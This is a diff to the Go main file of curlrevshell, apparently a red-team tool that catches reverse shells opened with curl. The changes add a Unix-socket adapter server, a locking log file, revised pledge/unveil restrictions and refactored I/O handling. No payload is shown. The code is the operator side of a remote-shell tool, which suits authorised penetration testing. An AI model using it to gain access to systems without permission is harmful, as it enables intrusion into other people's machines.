@@ -6,7 +6,7 @@ package main
  * Even worse reverse shell, powered by cURL
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20251107
+ * Last Modified 20270905
  */
 
 import (
@@ -23,9 +23,11 @@ import (
 	"path/filepath"
 	"syscall"
 
+	"github.com/magisterquis/curlrevshell/internal/adsrv"
 	"github.com/magisterquis/curlrevshell/internal/currentversion"
 	"github.com/magisterquis/curlrevshell/internal/hsrv"
 	"github.com/magisterquis/curlrevshell/internal/iobroker"
+	"github.com/magisterquis/curlrevshell/internal/lockingfile"
 	"github.com/magisterquis/curlrevshell/lib/crstemplate"
 	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/ezicanhazip"
@@ -72,7 +74,9 @@ const (
 
 func main() { os.Exit(rmain()) }
 func rmain() int {
-	pledgeunveil.MustPledge("cpath inet rpath stdio tty unveil wpath")
+	pledgeunveil.MustPledge(
+		"cpath flock inet rpath stdio tty unix unveil wpath",
+	)
 	/* Command-line flags. */
 	var cbAddrs []string
 	var (
@@ -80,6 +84,11 @@ func rmain() int {
 			"listen-address",
 			"0.0.0.0:4444",
 			"Listen `address`",
+		)
+		adapterPath = flag.String(
+			"experimental-adapter-socket",
+			"",
+			"Unix socket `path` for adapters",
 		)
 		fdir = flag.String(
 			"serve-files-from",
@@ -218,6 +227,7 @@ Options:
 
 	/* If we're just printing it, life's easy. */
 	if *printCtrlI {
+		pledgeunveil.MustPledge("rpath stdio unveil")
 		if err := pledgeunveil.MultiUnveil(
 			[][2]string{{*insertFile, "r"}},
 		); nil != err {
@@ -266,13 +276,18 @@ Options:
 		{*insertFile, "r"},
 		{*logFile, "cw"},
 		{*tmplf, "r"},
+		{*adapterPath, "cw"},
 	}); errors.Is(err, syscall.ENOENT) {
 		log.Printf("Unveil error: %s", err)
 		return 4
 	} else if nil != err {
 		panic("unveil: " + err.Error())
 	}
-	pledgeunveil.MustPledge("cpath inet rpath stdio tty wpath")
+	pledges := "cpath flock inet rpath stdio tty wpath"
+	if "" != *adapterPath {
+		pledges += " unix"
+	}
+	pledgeunveil.MustPledge(pledges)
 
 	/* Channels for comms between subsystems. */
 	var (
@@ -281,18 +296,14 @@ Options:
 	)
 
 	/* And an adapter betwen io.{Read,Writ}er and channels. */
-	iob, err := iobroker.New(ich, och)
-	if nil != err {
-		log.Printf("Error setting up comms between subsystems: %s", err)
-		return 3
-	}
+	iob := iobroker.New(och)
 
 	/* Set up logging.  If we're not writing to a logfile, we'll just kinda
 	discard log messages.  Beats checking for nil, anyways. */
 	lh := slog.DiscardHandler
 	if "" != *logFile {
 		/* Open the logfile. */
-		f, err := os.OpenFile(
+		f, err := lockingfile.OpenFile(
 			*logFile,
 			os.O_CREATE|os.O_WRONLY|os.O_APPEND,
 			0600,
@@ -387,17 +398,14 @@ Options:
 	}
 
 	/* HTTPS Server */
-	svr, err := hsrv.New(
+	hServer, err := hsrv.New(
 		sl,
 		*addr,
 		*tmplf,
-		ich,
-		och,
 		iob,
 		*certFile,
 		cbAddrs,
 		*printIPv6,
-		*oneShell,
 		*printDebug,
 		crstemplate.Params{
 			StaticFilesDir: *fdir,
@@ -418,12 +426,51 @@ Options:
 		)
 		return 2
 	}
+	shell.Logf(
+		opshell.ColorNone,
+		false,
+		"Listening on %s",
+		hServer.Addr(),
+	)
+
+	/* Adapter server. */
+	var adServer *adsrv.Server
+	if "" != *adapterPath {
+		var err error
+		if adServer, err = adsrv.New(
+			sl,
+			*adapterPath,
+			iob,
+		); nil != err {
+			shell.Logf(
+				opshell.ColorRed,
+				false,
+				"Error setting Adapter service: %s",
+				err,
+			)
+			return 7
+		}
+		shell.Logf(
+			opshell.ColorNone,
+			false,
+			"Listening for adapters on %s",
+			adServer.Addr(),
+		)
+	}
+
+	/* Print helpful help messages. */
+	hServer.RegisterOneLiners()
 
 	/* Start ALL the things. */
 	eg, ectx := ctxerrgroup.WithContext(context.Background())
 	eg.GoTag(ectx, "shell", shell.Do)
-	eg.GoTag(ectx, "server", svr.Do)
-	eg.GoTag(ectx, "i/o broker", iob.Do)
+	eg.GoTag(ectx, "server", hServer.Do)
+	eg.GoTag(ectx, "i/o broker", func(ctx context.Context) error {
+		return iob.Run(ctx, ich, *oneShell)
+	})
+	if nil != adServer {
+		eg.GoTag(ectx, "adapter", adServer.Run)
+	}
 
 	/* SIGUSR1 is equivalent to Ctrl+I. */
 	eg.GoContext(ectx, func(ctx context.Context) error {
@@ -444,8 +491,10 @@ Options:
 	err = eg.Wait()
 	shell.SetPrompt("")
 	if nil != err &&
+		!errors.Is(err, hsrv.ErrOneShellClosed) &&
 		!errors.Is(err, io.EOF) &&
-		!errors.Is(err, hsrv.ErrOneShellClosed) {
+		!errors.Is(err, iobroker.ErrInputClosed) &&
+		!errors.Is(err, opshell.ErrInputDone) {
 		shell.Logf(opshell.ColorRed, false, "Fatal error: %s", err)
 		sl.Info(LMTerminating, hsrv.LKError, err)
 		return 1
